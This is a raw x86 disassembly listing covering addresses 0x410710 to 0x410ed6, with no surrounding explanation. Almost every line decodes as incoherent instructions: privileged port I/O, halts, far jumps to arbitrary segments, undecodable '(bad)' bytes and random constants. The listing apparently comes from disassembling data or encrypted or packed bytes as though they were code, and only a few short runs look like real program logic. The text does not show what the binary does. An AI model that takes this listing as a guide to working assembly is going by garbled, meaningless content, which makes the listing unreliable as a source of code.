  410710:	or     ebx,DWORD PTR [edi]
  410712:	inc    eax
  410713:	push   ss
  410714:	pop    ebp
  410715:	enter  0x1274,0xd3
  410719:	or     BYTE PTR [ebx],ah
  41071b:	cmc    
  41071c:	fist   DWORD PTR [ecx+0xf]
  41071f:	adc    eax,esi
  410721:	stc    
  410722:	sbb    BYTE PTR [ebp+0x5d],0x1f
  410726:	push   0xffffff8c
  410728:	out    dx,eax
  410729:	repnz cmp BYTE PTR [ebx+0x42],ch
  41072d:	push   es
  41072e:	or     BYTE PTR [edx],0xb
  410731:	mov    esp,0x5fa50185
  410736:	jns    0x41072a
  410738:	std    
  410739:	and    al,0xfa
  41073b:	jb     0x4106d4
  41073d:	hlt    
  41073e:	aas    
  41073f:	ins    BYTE PTR es:[edi],dx
  410740:	stos   BYTE PTR es:[edi],al
  410741:	mov    ?,WORD PTR [eax-0x327298]
  410747:	sub    eax,ecx
  410749:	sub    eax,DWORD PTR [ebp-0x4]
  41074c:	jmp    0x410c57
  410751:	retf   0xc0cd
  410754:	rcr    bl,1
  410756:	aad    0xda
  410758:	shl    DWORD PTR [ecx-0x2297228b],1
  41075e:	jl     0x4107a1
  410760:	jecxz  0x4106fa
  410762:	fs js  0x4107dd
  410765:	push   0x7c
  410767:	js     0x4107e1
  410769:	xor    DWORD PTR [edx-0x65],0xffffffb8
  41076d:	xchg   ebx,eax
  41076e:	mov    edi,0x4125eb8
  410773:	xchg   esi,eax
  410774:	pusha  
  410775:	jmp    0xcb0e:0x667a04d2
  41077c:	adc    edx,DWORD PTR [edi-0x71]
  41077f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410780:	xchg   dh,dh
  410782:	push   edx
  410783:	pop    ss
  410784:	jle    0x410802
  410786:	loope  0x410797
  410788:	push   ds
  410789:	cmp    ah,cl
  41078b:	mov    ebp,0xd264630c
  410790:	pusha  
  410791:	mov    edx,0x3b951722
  410796:	test   DWORD PTR [esi],eax
  410798:	xchg   BYTE PTR [eiz*1-0x217b6e7a],bl
  41079f:	sbb    dh,BYTE PTR [ecx-0x1e2554f6]
  4107a5:	into   
  4107a6:	push   edi
  4107a7:	enter  0x6009,0x12
  4107ab:	(bad)  
  4107ac:	and    bh,ah
  4107ae:	pop    ds
  4107af:	cmp    ch,bh
  4107b1:	mov    dh,0x7f
  4107b3:	sbb    DWORD PTR [edi],ebp
  4107b5:	push   esp
  4107b6:	scas   al,BYTE PTR es:[edi]
  4107b7:	mov    edi,0xecd658d
  4107bc:	xchg   esi,eax
  4107bd:	adc    cl,BYTE PTR ds:0x7f112dee
  4107c3:	mov    al,0xce
  4107c5:	test   al,0x9a
  4107c7:	aas    
  4107c8:	pusha  
  4107c9:	outs   dx,DWORD PTR ds:[esi]
  4107ca:	sbb    BYTE PTR fs:[esp+ebx*1],al
  4107ce:	mov    ch,BYTE PTR [ebx+0x40cae345]
  4107d4:	adc    ebx,DWORD PTR gs:[edi+0x47]
  4107d8:	stc    
  4107d9:	test   DWORD PTR [ebx+0x3c],0x321d398a
  4107e0:	mov    eax,0x58c43d68
  4107e5:	loop   0x410775
  4107e7:	cli    
  4107e8:	stos   DWORD PTR es:[edi],eax
  4107e9:	mov    ecx,0x94d4bc9d
  4107ee:	psubusb mm5,QWORD PTR [edx+0x3d]
  4107f2:	pop    esp
  4107f3:	mov    ds:0x1d257059,al
  4107f8:	stc    
  4107f9:	cld    
  4107fa:	rcl    DWORD PTR [ecx],cl
  4107fc:	mov    esi,0x86a8f44a
  410801:	fldenv [ecx+esi*2-0x2fa747f]
  410808:	or     esp,DWORD PTR [ecx+0x37d13b07]
  41080e:	adc    edi,DWORD PTR [edi+0x253dbb3a]
  410814:	test   al,0x2a
  410816:	int3   
  410817:	sti    
  410818:	retf   0xf928
  41081b:	shl    DWORD PTR [ebp-0x5],1
  41081e:	add    al,0xdc
  410820:	jp     0x4107e9
  410822:	and    eax,0x89a32e28
  410827:	fcom   DWORD PTR [eax+0x4fd6ad62]
  41082d:	les    edx,FWORD PTR ds:0x758cfd9f
  410833:	push   eax
  410834:	jns    0x4107e3
  410836:	fadd   QWORD PTR [esi-0x65]
  410839:	add    esi,DWORD PTR [ebx+0x40cd2bd5]
  41083f:	add    DWORD PTR [edx+0x1e],esp
  410842:	loopne 0x410816
  410844:	dec    edi
  410845:	imul   ebx,ebp,0x4f
  410848:	(bad)  
  410849:	jnp    0x41089d
  41084b:	mov    ds:0x86425174,al
  410850:	in     al,0x4d
  410852:	in     al,dx
  410853:	mov    edx,0xaff36c3e
  410858:	xchg   ebp,eax
  410859:	mul    DWORD PTR [ebp-0x45fdb414]
  41085f:	and    edi,DWORD PTR [eax]
  410861:	rol    esp,cl
  410863:	iret   
  410864:	cs fs jl 0x4108af
  410868:	cmp    cl,BYTE PTR [ebp+0x72]
  41086b:	aas    
  41086c:	bound  ecx,QWORD PTR [edx-0x3c]
  41086f:	outs   dx,DWORD PTR ds:[esi]
  410870:	fld    QWORD PTR [edi-0x1ff2e6cb]
  410876:	xlat   BYTE PTR ds:[ebx]
  410877:	mov    cs,WORD PTR [edi]
  410879:	inc    edi
  41087a:	iret   
  41087b:	gs push esi
  41087d:	inc    edx
  41087e:	out    dx,al
  41087f:	adc    DWORD PTR [edx],edi
  410881:	mov    edi,0x9dec4751
  410886:	adc    ch,BYTE PTR ds:0xe45a8523
  41088c:	(bad)  
  41088d:	mov    edx,0x790ba4ac
  410892:	xor    DWORD PTR [eax+ebp*1-0x70a19bb],0x6343e6a3
  41089d:	enter  0x48c4,0x45
  4108a1:	mov    edx,0x758dd19e
  4108a6:	ss mov cs,ebp
  4108a9:	out    dx,al
  4108aa:	jg     0x410901
  4108ac:	inc    ecx
  4108ad:	in     eax,0x84
  4108af:	fxtract 
  4108b1:	pusha  
  4108b2:	push   ebx
  4108b3:	das    
  4108b4:	mov    ss,WORD PTR [esi-0x6bfded8e]
  4108ba:	cmc    
  4108bb:	and    DWORD PTR [ecx+0x203dd504],esi
  4108c1:	push   ecx
  4108c2:	aad    0x2c
  4108c4:	ins    BYTE PTR es:[edi],dx
  4108c5:	rol    esi,1
  4108c7:	sahf   
  4108c8:	mov    bh,0x36
  4108ca:	aaa    
  4108cb:	in     eax,dx
  4108cc:	fstp   DWORD PTR [esi+0x173b1db5]
  4108d2:	sbb    dl,BYTE PTR [ecx]
  4108d4:	cli    
  4108d5:	sbb    dh,bh
  4108d7:	pop    eax
  4108d8:	mov    al,ds:0x6949bd8d
  4108dd:	push   es
  4108de:	adc    bl,BYTE PTR [ebx+0x6103359d]
  4108e4:	add    DWORD PTR [ecx+esi*2+0x50],0xaeb66bfe
  4108ec:	push   ebp
  4108ed:	mov    cl,BYTE PTR [edx]
  4108ef:	dec    edx
  4108f0:	jbe    0x410895
  4108f2:	jb     0x410912
  4108f4:	rcl    DWORD PTR [ecx],0xfd
  4108f7:	outs   dx,DWORD PTR ds:[esi]
  4108f8:	mov    bl,0x33
  4108fa:	ficom  DWORD PTR [ecx]
  4108fc:	sbb    ecx,DWORD PTR [ebx-0x3c]
  4108ff:	imul   ah
  410901:	rol    DWORD PTR [ebp+0x5e],0xd1
  410905:	push   es
  410906:	ror    BYTE PTR [esi+ebx*2-0x10ea4ea],cl
  41090d:	inc    esp
  41090e:	mov    BYTE PTR [edx+0x3fdfa4a3],ah
  410914:	clc    
  410915:	arpl   si,si
  410917:	int    0x26
  410919:	ds je  0x410933
  41091c:	mov    eax,DWORD PTR [bp+si+0x51]
  410920:	push   ss
  410921:	mov    dl,0xc2
  410923:	loopne 0x4108ec
  410925:	imul   DWORD PTR [ecx+0x38]
  410928:	(bad)  
  41092a:	pop    ds
  41092b:	mov    esi,DWORD PTR [edx]
  41092d:	xor    ecx,DWORD PTR [esi]
  41092f:	mov    bh,0x39
  410931:	sub    BYTE PTR [ebp+0x32ea8fe4],0x4c
  410938:	push   ds
  410939:	lds    edi,FWORD PTR [edx-0x13d709a9]
  41093f:	xor    ebp,edx
  410941:	add    edx,ecx
  410943:	or     al,0xf0
  410945:	mov    ch,0x49
  410947:	jg     0x4108ec
  410949:	dec    ebx
  41094a:	fwait
  41094b:	mov    bl,0xa7
  41094d:	mov    esp,0xe02db546
  410952:	mov    ah,0x42
  410954:	call   0xde5ed3c8
  410959:	sub    BYTE PTR [ecx-0xc],ch
  41095c:	cmp    ecx,DWORD PTR [ebp-0xaf8657c]
  410962:	(bad)  
  410964:	dec    ecx
  410965:	pop    ebx
  410966:	inc    ecx
  410967:	int3   
  410968:	or     DWORD PTR [esp+ebp*8+0x6f4f61d3],eax
  41096f:	sti    
  410970:	inc    esi
  410971:	push   ds
  410972:	jae    0x41096a
  410974:	and    esp,DWORD PTR [eax+0x6]
  410977:	push   0xffffff9f
  410979:	ins    DWORD PTR es:[edi],dx
  41097a:	xchg   DWORD PTR ds:0xf74cf38a,esp
  410980:	inc    eax
  410981:	xchg   BYTE PTR [ebp+0x4a],dl
  410984:	add    ch,BYTE PTR ss:[eax-0x2a]
  410988:	or     bl,BYTE PTR [ebp+0x50]
  41098b:	mov    ch,0x9b
  41098d:	scas   eax,DWORD PTR es:[edi]
  41098e:	pop    esp
  41098f:	or     DWORD PTR [ecx],ebx
  410991:	sbb    dh,al
  410993:	sub    esi,ebx
  410995:	mov    ebp,0xcaef1854
  41099a:	sub    edi,DWORD PTR [ecx]
  41099c:	jl     0x4109ae
  41099e:	pusha  
  41099f:	fldenv [ecx-0x20]
  4109a2:	mov    ch,bl
  4109a4:	dec    edx
  4109a5:	jmp    0x41092d
  4109a7:	cli    
  4109a8:	sub    al,0x35
  4109aa:	cld    
  4109ab:	stos   BYTE PTR es:[edi],al
  4109ac:	icebp  
  4109ad:	sbb    eax,0x8646de0e
  4109b2:	out    0xb2,eax
  4109b4:	jmp    0x4c1a:0x86fa93a
  4109bb:	test   dl,dh
  4109bd:	jae    0x410a02
  4109bf:	pop    esi
  4109c0:	mov    ch,0x14
  4109c2:	push   esp
  4109c3:	fidiv  WORD PTR [ebp+0x42]
  4109c6:	xchg   esi,eax
  4109c7:	push   ecx
  4109c8:	iret   
  4109c9:	repnz or ebp,DWORD PTR [ebp+0x7d5d10dd]
  4109d0:	mov    cl,0x71
  4109d2:	sub    DWORD PTR [esp+ebp*4-0x22561ca4],0xb9032985
  4109dd:	rol    BYTE PTR [edi-0x1181758d],1
  4109e3:	retf   
  4109e4:	imul   ebp,DWORD PTR [esi],0x2a
  4109e7:	lods   eax,DWORD PTR ds:[esi]
  4109e8:	das    
  4109e9:	enter  0x583b,0xec
  4109ed:	(bad)  
  4109ee:	jno    0x410999
  4109f0:	and    DWORD PTR [esi-0x4e],0x97b06909
  4109f7:	loope  0x4109a0
  4109f9:	cmp    al,0x62
  4109fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4109fc:	into   
  4109fd:	add    BYTE PTR ss:[eax+0x17260c71],dl
  410a04:	push   esi
  410a05:	popf   
  410a06:	aas    
  410a07:	stos   DWORD PTR es:[edi],eax
  410a08:	cmp    DWORD PTR [edi-0x21166286],esp
  410a0e:	fwait
  410a0f:	adc    bl,bh
  410a11:	xor    cl,dh
  410a13:	inc    edi
  410a14:	je     0x4109a7
  410a16:	fisttp QWORD PTR [eax+0x36]
  410a19:	mov    eax,ds:0x7c42a6e2
  410a1e:	iret   
  410a1f:	add    eax,0x15cbaefe
  410a24:	lahf   
  410a25:	add    dl,BYTE PTR [edi*1+0x56d3a2b4]
  410a2c:	push   ss
  410a2d:	add    cl,BYTE PTR fs:[ebx+0x50e6988d]
  410a34:	hlt    
  410a35:	stos   DWORD PTR es:[edi],eax
  410a36:	(bad)  
  410a37:	repz jo 0x410a4d
  410a3a:	or     al,0x1d
  410a3c:	xchg   ecx,eax
  410a3d:	scas   al,BYTE PTR es:[edi]
  410a3e:	into   
  410a3f:	adc    al,0x22
  410a41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a42:	cwde   
  410a43:	scas   al,BYTE PTR es:[edi]
  410a44:	retf   0xd04b
  410a47:	cmc    
  410a48:	test   ebp,edx
  410a4a:	pusha  
  410a4b:	sbb    DWORD PTR [ebp+0x683bc15d],edx
  410a51:	push   0xf69b5b31
  410a56:	mov    ah,ch
  410a58:	out    dx,eax
  410a59:	shr    BYTE PTR [ecx],1
  410a5b:	mov    esi,0x12a0135d
  410a60:	test   al,ch
  410a62:	pop    ebx
  410a63:	fcmovb st,st(4)
  410a65:	adc    ebp,DWORD PTR [edx-0xc4bcdfc]
  410a6b:	and    ah,BYTE PTR [eax+0x71]
  410a6e:	pop    ebx
  410a6f:	push   ebx
  410a70:	xlat   BYTE PTR ds:[ebx]
  410a71:	leave  
  410a72:	xor    esp,DWORD PTR [eax]
  410a74:	cmp    ah,BYTE PTR [esp+ebp*1-0x10fa7d1]
  410a7b:	nop
  410a7c:	push   0x4
  410a7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a7f:	cli    
  410a80:	fs scas eax,DWORD PTR es:[edi]
  410a82:	in     al,0xb0
  410a84:	fidiv  WORD PTR [ecx+0x5838c402]
  410a8a:	les    esi,FWORD PTR [ebp-0x3b]
  410a8d:	out    dx,al
  410a8e:	cmp    BYTE PTR [edi-0x49b0da90],ch
  410a94:	xor    al,0x5
  410a96:	sbb    BYTE PTR [ecx],cl
  410a98:	jle    0x410a26
  410a9a:	lahf   
  410a9b:	jns    0x410a84
  410a9d:	jmp    0x410ad7
  410a9f:	jl     0x410acf
  410aa1:	(bad)  
  410aa3:	ss mov al,0xd5
  410aa6:	mov    dl,0x27
  410aa8:	or     DWORD PTR [edi+0x36],ebp
  410aab:	ror    BYTE PTR [edx-0x1c],cl
  410aae:	push   ds
  410aaf:	imul   ebx,DWORD PTR [ebx],0xa6751efe
  410ab5:	leave  
  410ab6:	fbld   TBYTE PTR [eax+0x13]
  410ab9:	loopne 0x410aaf
  410abb:	push   ebp
  410abc:	xchg   ebx,eax
  410abd:	mov    ah,0x97
  410abf:	iret   
  410ac0:	out    dx,eax
  410ac1:	fild   QWORD PTR [ebx-0x4f]
  410ac4:	les    ebp,FWORD PTR ds:0x3141297c
  410aca:	cli    
  410acb:	repz jae 0x410b49
  410ace:	mov    edx,0x18bb728c
  410ad3:	imul   edx,DWORD PTR [bx-0x34],0xd128fdf5
  410adb:	bound  edx,QWORD PTR [ebx+0xe0aecd9]
  410ae1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ae2:	pop    esi
  410ae3:	or     bl,bl
  410ae5:	stos   BYTE PTR es:[edi],al
  410ae6:	jnp    0x410aa1
  410ae8:	pop    eax
  410ae9:	jb     0x410a7b
  410aeb:	(bad)  
  410aec:	pop    ebx
  410aed:	les    edx,FWORD PTR [ebp-0x508fee0a]
  410af3:	cmc    
  410af4:	inc    esi
  410af5:	clc    
  410af6:	aad    0x31
  410af8:	imul   ebx,DWORD PTR [eax-0x61],0x49755ea0
  410aff:	fs (bad) 
  410b01:	retf   
  410b02:	(bad)  
  410b03:	push   ebp
  410b04:	addr16 jp 0x410aaf
  410b07:	xchg   DWORD PTR [eax+ecx*8-0x6665b304],esp
  410b0e:	mov    DWORD PTR [edi],ebp
  410b10:	mov    ebp,0xa3956e43
  410b15:	rcr    DWORD PTR [ebx-0x30967054],0xb0
  410b1c:	leave  
  410b1d:	cld    
  410b1e:	xor    dl,BYTE PTR [ecx+0x6d]
  410b21:	xor    ebp,DWORD PTR [ecx+0x5b]
  410b24:	jbe    0x410b49
  410b26:	test   DWORD PTR [esi+0x4edc9c75],ecx
  410b2c:	or     edx,DWORD PTR [edx+0xdc3ee77]
  410b32:	mov    edi,0xb9c90adb
  410b37:	sub    al,0xf6
  410b39:	iret   
  410b3a:	sub    ch,dh
  410b3c:	cmp    BYTE PTR ds:0xf3675dea,dl
  410b42:	inc    esi
  410b43:	in     al,0x67
  410b45:	sti    
  410b46:	mov    bl,0x89
  410b48:	or     DWORD PTR [eax-0x56],ecx
  410b4b:	fsubr  QWORD PTR [ebx+0x79]
  410b4e:	in     al,dx
  410b4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b50:	leave  
  410b51:	sbb    edx,ecx
  410b53:	(bad)  
  410b54:	into   
  410b55:	ins    BYTE PTR es:[edi],dx
  410b56:	push   edi
  410b57:	cmp    eax,DWORD PTR [ecx-0x28de0ae8]
  410b5d:	dec    edx
  410b5e:	lock retf 
  410b60:	fcmovne st,st(3)
  410b62:	sbb    al,0x67
  410b64:	adc    edi,DWORD PTR [ecx+0x42]
  410b67:	out    dx,eax
  410b68:	pop    es
  410b69:	inc    esi
  410b6a:	pop    esp
  410b6b:	lahf   
  410b6c:	stc    
  410b6d:	retf   0x404
  410b70:	data16 lock out dx,al
  410b73:	jecxz  0x410b58
  410b75:	(bad)  
  410b76:	cld    
  410b77:	or     BYTE PTR ds:0x8fd36cd3,dl
  410b7d:	adc    al,BYTE PTR [ebp+0x75853c5a]
  410b83:	add    eax,DWORD PTR [ebx]
  410b85:	xor    eax,0xee4d0ee5
  410b8a:	mov    al,0x76
  410b8c:	out    dx,eax
  410b8d:	mov    ds:0xe4ac904d,eax
  410b92:	pop    ds
  410b93:	out    dx,eax
  410b94:	jle    0x410b37
  410b96:	sar    DWORD PTR [eax-0x39],1
  410b99:	test   eax,0x44ee0fb2
  410b9e:	fmul   st,st(1)
  410ba0:	mov    bh,0x4b
  410ba2:	or     BYTE PTR [eax+0x52],bh
  410ba5:	cmp    dh,BYTE PTR [esi-0x41]
  410ba8:	retf   0xab48
  410bab:	and    DWORD PTR [ebx],ebx
  410bad:	stc    
  410bae:	je     0x410b57
  410bb0:	(bad)
  410bb3:	fwait
  410bb4:	stos   BYTE PTR es:[edi],al
  410bb5:	push   eax
  410bb6:	call   edi
  410bb8:	jmp    0x675a:0x98e8b2e2
  410bbf:	and    al,0xe1
  410bc1:	cld    
  410bc2:	sub    esi,0x74
  410bc5:	shl    BYTE PTR [edi-0x15],1
  410bc8:	arpl   WORD PTR [edi+edx*4+0x213a0fd9],si
  410bcf:	jecxz  0x410c31
  410bd1:	bound  ecx,QWORD PTR [ebx]
  410bd3:	sub    eax,0x281ef85
  410bd8:	sub    dh,BYTE PTR [ebp-0x6ee92526]
  410bde:	sub    al,0x6d
  410be0:	loop   0x410bc9
  410be2:	xor    DWORD PTR [edx+0x5b],0x3b
  410be6:	sbb    BYTE PTR [ebp+0x5e57350c],al
  410bec:	leave  
  410bed:	mov    cl,0xfc
  410bef:	outs   dx,BYTE PTR ds:[esi]
  410bf0:	mov    ds:0x291f0d3d,al
  410bf5:	and    edx,DWORD PTR [eax+0x488bc8f0]
  410bfb:	jb     0x410be2
  410bfd:	dec    eax
  410bfe:	mov    esp,edx
  410c00:	out    dx,al
  410c01:	adc    eax,0xfcdeaaec
  410c06:	and    al,0x9b
  410c08:	push   ecx
  410c09:	aam    0x7d
  410c0b:	int3   
  410c0c:	or     DWORD PTR [esi+eiz*8-0x57],ebp
  410c10:	jmp    0x797f:0x6223b973
  410c17:	arpl   WORD PTR [ebp+0xf],bx
  410c1a:	pop    edi
  410c1b:	lock jb 0x410bce
  410c1e:	stos   DWORD PTR es:[edi],eax
  410c1f:	mov    WORD PTR [edi+0x5f5a526e],?
  410c25:	cli    
  410c26:	or     esi,DWORD PTR [ecx+0x77]
  410c29:	sahf   
  410c2a:	xchg   ecx,eax
  410c2b:	mov    dl,0x5c
  410c2d:	nop
  410c2e:	iret   
  410c2f:	dec    edx
  410c30:	cmp    al,0xb3
  410c32:	xchg   eax,edx
  410c34:	jo     0x410bfc
  410c36:	jg     0x410cb5
  410c38:	push   esp
  410c39:	dec    esp
  410c3a:	(bad)  
  410c3c:	icebp  
  410c3d:	into   
  410c3e:	inc    edx
  410c3f:	add    al,0xee
  410c41:	out    0xfa,al
  410c43:	adc    BYTE PTR [ecx],dh
  410c45:	dec    edx
  410c46:	rcr    DWORD PTR [edx+edi*1+0x700040bc],1
  410c4d:	sub    eax,0x2fb603ac
  410c52:	inc    esi
  410c53:	lods   eax,DWORD PTR ds:[esi]
  410c54:	pop    esp
  410c55:	push   ecx
  410c56:	leave  
  410c57:	mov    ecx,DWORD PTR [ebp-0x48]
  410c5a:	add    ecx,eax
  410c5c:	mov    eax,DWORD PTR [ebp-0x4]
  410c5f:	mov    DWORD PTR [eax+0x1],ecx
  410c62:	mov    al,BYTE PTR [ebp-0x11]
  410c65:	jmp    0x411170
  410c6a:	rol    dl,0x3f
  410c6d:	ds leave 
  410c6f:	rol    ebp,0xca
  410c72:	stos   DWORD PTR es:[edi],eax
  410c73:	test   BYTE PTR [eax],cl
  410c75:	leave  
  410c76:	into   
  410c77:	out    0x5c,al
  410c79:	mov    ah,0x8a
  410c7b:	outs   dx,DWORD PTR ds:[esi]
  410c7c:	js     0x410cf6
  410c7e:	push   0x7c
  410c80:	js     0x410cfa
  410c82:	out    0x97,eax
  410c84:	fadd   DWORD PTR [ecx+0x2a]
  410c87:	dec    esi
  410c88:	xchg   ecx,eax
  410c89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c8a:	push   eax
  410c8b:	leave  
  410c8c:	in     al,dx
  410c8d:	xchg   ebx,eax
  410c8e:	ror    BYTE PTR [ebx-0x2121affd],0x56
  410c95:	(bad)  
  410c96:	retf   
  410c97:	in     eax,dx
  410c98:	outs   dx,BYTE PTR ds:[esi]
  410c99:	sbb    DWORD PTR [ecx+eax*1+0x40],0x9c017d80
  410ca1:	jo     0x410cd3
  410ca3:	dec    esp
  410ca4:	sub    eax,0x847964cc
  410ca9:	fidivr DWORD PTR [edx+edx*8]
  410cac:	jnp    0x410cb3
  410cae:	xchg   ecx,eax
  410caf:	pop    ebp
  410cb0:	add    al,0x27
  410cb2:	xchg   ebx,eax
  410cb3:	and    DWORD PTR [ebp+ecx*1+0x4],edi
  410cb7:	es pop esp
  410cb9:	mov    dl,0x84
  410cbb:	seto   ch
  410cbe:	out    dx,al
  410cbf:	imul   edx,ebp,0xfffffff8
  410cc2:	ins    BYTE PTR es:[edi],dx
  410cc3:	stos   BYTE PTR es:[edi],al
  410cc4:	in     eax,dx
  410cc5:	pop    es
  410cc6:	shl    BYTE PTR [edx+ecx*2-0x545e3383],1
  410ccd:	push   0x45cd11fd
  410cd2:	cmp    al,0xd8
  410cd4:	push   ebp
  410cd5:	leave  
  410cd6:	(bad)  
  410cd7:	lds    edi,FWORD PTR [eax-0x60]
  410cda:	pop    ss
  410cdb:	push   ds
  410cdc:	pop    ds
  410cdd:	cs in  al,0x87
  410ce0:	adc    al,0xca
  410ce2:	mov    ds:0x2a0a4cf1,eax
  410ce7:	fcomp  DWORD PTR [ebp-0x569e0313]
  410ced:	mov    ebx,0x6f99cfb5
  410cf2:	mov    ebx,0x86720cca
  410cf7:	sbb    eax,0x5d823c2a
  410cfc:	cmp    eax,0x5727b399
  410d01:	into   
  410d02:	push   ebp
  410d03:	loope  0x410cd1
  410d05:	popa   
  410d06:	imul   ecx,ebp,0xca3c6e2
  410d0c:	pop    ecx
  410d0d:	call   0x209b:0x50f21721
  410d14:	cld    
  410d15:	mov    dl,0x57
  410d17:	and    DWORD PTR [eax],ecx
  410d19:	test   BYTE PTR fs:[ebx-0x7681fa83],al
  410d20:	std    
  410d21:	cdq    
  410d22:	mov    ebx,0xbe2d2625
  410d27:	pop    ebx
  410d28:	sub    esp,DWORD PTR [ebx]
  410d2a:	out    dx,eax
  410d2b:	fs retf 0x8e9c
  410d2f:	fwait
  410d30:	ret    
  410d31:	jno    0x410ccf
  410d33:	retf   
  410d34:	and    al,BYTE PTR [ecx]
  410d36:	jle    0x410d11
  410d38:	daa    
  410d39:	repz xlat BYTE PTR ds:[ebx]
  410d3b:	imul   ebx,eax,0x80551668
  410d41:	retf   
  410d42:	dec    edi
  410d43:	call   0x2370:0x8bb68537
  410d4a:	adc    edi,DWORD PTR [ebp+0xdde4232]
  410d50:	and    eax,0x90c4873f
  410d55:	push   ss
  410d56:	jbe    0x410d15
  410d58:	fadd   st(7),st
  410d5a:	fild   QWORD PTR [eax+0x45]
  410d5d:	adc    ecx,ebp
  410d5f:	jae    0x410da9
  410d61:	jecxz  0x410ddf
  410d63:	mov    bl,0x54
  410d65:	popa   
  410d66:	add    al,0x8d
  410d68:	sbb    ebp,DWORD PTR [ecx-0x42008455]
  410d6e:	stos   DWORD PTR es:[edi],eax
  410d6f:	(bad)  
  410d70:	sub    DWORD PTR [ecx+0x717a7892],ebx
  410d76:	rcl    DWORD PTR [esp+edx*8+0x27],cl
  410d7a:	aam    0xe6
  410d7c:	mov    ebx,esp
  410d7e:	ret    0x1941
  410d81:	popf   
  410d82:	xchg   esi,eax
  410d83:	mov    bh,0x46
  410d85:	add    DWORD PTR [ebp-0x1],ecx
  410d88:	jge    0x410da9
  410d8a:	test   BYTE PTR [edx],dl
  410d8c:	lahf   
  410d8d:	push   edi
  410d8e:	leave  
  410d8f:	jp     0x410d5b
  410d91:	sar    BYTE PTR [eax+0x7f],1
  410d94:	sbb    al,0x4c
  410d96:	jecxz  0x410d9a
  410d98:	retf   0xab98
  410d9b:	sar    ah,0x61
  410d9e:	xchg   DWORD PTR [edx],edx
  410da0:	sbb    eax,eax
  410da2:	inc    ebx
  410da3:	jae    0x410e18
  410da5:	jg     0x410d2c
  410da7:	rcr    eax,0x63
  410daa:	and    ch,BYTE PTR [eax]
  410dac:	lahf   
  410dad:	mov    edi,0x3e20a2eb
  410db2:	leave  
  410db3:	cmp    esi,DWORD PTR [edi-0x2c4e92bd]
  410db9:	xchg   esp,eax
  410dba:	jns    0x410db5
  410dbc:	test   DWORD PTR [esi-0x43],0xed5bf745
  410dc3:	lock ins DWORD PTR es:[edi],dx
  410dc5:	add    dl,BYTE PTR [eax-0x51d6206a]
  410dcb:	adc    BYTE PTR gs:[esi+0x36],ch
  410dcf:	cmp    ebx,edi
  410dd1:	xlat   BYTE PTR ds:[ebx]
  410dd2:	push   ss
  410dd3:	cs nop
  410dd5:	pop    edx
  410dd6:	rcr    esi,1
  410dd8:	add    al,0x98
  410dda:	fiadd  DWORD PTR [esi]
  410ddc:	clc    
  410ddd:	push   es
  410dde:	mov    bh,0xad
  410de0:	mov    dh,0xe3
  410de2:	push   edx
  410de3:	push   0x8
  410de5:	sub    bh,cl
  410de7:	dec    ebx
  410de8:	sbb    eax,eax
  410dea:	in     al,dx
  410deb:	retf   0xc54c
  410dee:	xchg   edi,eax
  410def:	mov    BYTE PTR [edx-0x3aca9588],dl
  410df5:	and    eax,0x2018cba3
  410dfa:	mov    ds,WORD PTR [esi-0x45]
  410dfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410dfe:	mov    cl,0x33
  410e00:	mov    al,ds:0xe58f4395
  410e05:	imul   ebx,DWORD PTR [ebx-0x2],0x9977a098
  410e0c:	jae    0x410e16
  410e0e:	call   0x7b34:0x7cbb3471
  410e15:	scas   al,BYTE PTR es:[edi]
  410e16:	iret   
  410e17:	test   al,0x8e
  410e19:	les    ecx,FWORD PTR [esi-0x13e221f0]
  410e1f:	lahf   
  410e20:	cmp    bh,BYTE PTR [ebx]
  410e22:	mov    ebp,0xb9710273
  410e27:	dec    ebp
  410e28:	dec    esi
  410e29:	and    edi,DWORD PTR [eax-0xb]
  410e2c:	jle    0x410e5a
  410e2e:	pop    ecx
  410e2f:	(bad)  
  410e32:	xchg   BYTE PTR [esp+eax*2],dh
  410e35:	mov    ch,0x54
  410e37:	add    eax,0x45ef0330
  410e3c:	je     0x410e7b
  410e3e:	fscale 
  410e40:	sub    ch,BYTE PTR [esi+edi*1]
  410e43:	inc    esi
  410e44:	(bad)  
  410e45:	daa    
  410e46:	mov    ds:0x79d43c4c,al
  410e4b:	leave  
  410e4c:	lods   eax,DWORD PTR ds:[esi]
  410e4d:	and    BYTE PTR [edi+ecx*2],0xf6
  410e51:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e53:	outs   dx,BYTE PTR ds:[esi]
  410e54:	cs sub eax,0x92d311cc
  410e5a:	fst    QWORD PTR ds:[eax+0x20]
  410e5e:	sub    ch,dl
  410e60:	int3   
  410e61:	jmp    0x8c3e:0x4dd7836e
  410e68:	dec    esp
  410e69:	sbb    DWORD PTR [edi-0x1d],ebp
  410e6c:	sub    edi,ebx
  410e6e:	dec    eax
  410e6f:	fidiv  WORD PTR [edi+ecx*8]
  410e72:	test   eax,0xfe5c5396
  410e77:	sahf   
  410e78:	retf   0x9bec
  410e7b:	jnp    0x410e3c
  410e7d:	bound  edi,QWORD PTR [esi]
  410e7f:	popa   
  410e80:	gs mov cl,0x68
  410e83:	ss jns 0x410ea3
  410e86:	jmp    0xe5ef80f1
  410e8b:	jne    0x410e2f
  410e8d:	test   eax,0x3131a107
  410e92:	dec    esp
  410e93:	idiv   BYTE PTR [ebp-0x4dbb24df]
  410e99:	aaa    
  410e9a:	add    esi,ebx
  410e9c:	pop    ebx
  410e9d:	add    DWORD PTR [edi+0x8],edx
  410ea0:	int3   
  410ea1:	(bad)  
  410ea3:	sbb    DWORD PTR [edx+0x2683a9fe],ebx
  410ea9:	jmp    0x119c1612
  410eae:	sbb    DWORD PTR [ebx+ebp*2+0x64],eax
  410eb2:	mov    ds:0x6bbe966,eax
  410eb7:	test   BYTE PTR [ebp-0x24],0x83
  410ebb:	mov    ds:0xea4edc44,eax
  410ec0:	in     al,0x4b
  410ec2:	mov    edx,0xb73eaf7c
  410ec7:	inc    edi
  410ec8:	jmp    0xc60a:0x1154aad8
  410ecf:	lods   eax,DWORD PTR ds:[esi]
  410ed0:	test   al,0x93
  410ed2:	add    DWORD PTR [edi],edx
  410ed4:	and    edx,ebx
  410ed6:	sub    BYTE PTR [esi-0x223d7669],ah
